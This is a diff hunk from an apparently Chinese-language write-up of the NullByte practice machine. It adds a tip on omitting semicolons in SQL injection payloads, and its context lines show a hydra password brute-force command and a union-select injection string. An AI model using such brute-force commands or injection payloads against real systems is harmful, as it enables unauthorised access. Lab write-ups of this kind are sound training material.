@@ -160,6 +160,8 @@ hydra -l admin -P "/usr/share/wordlists/rockyou.txt" 192.168.174.132 http-form-p
 " union select 1,2,3;--+
 ```
 
+（注意。除了堆叠注入外一般不要加分号，虽然大多数没影响，极少数会报错，但还是不建议加）
+
 ![image-20260512155211877](NullByte.assets/image-20260512155211877-1778572333403-19.png)
 
 从之前测列数的过程中，第一个和第二个表格都出现过，并且有
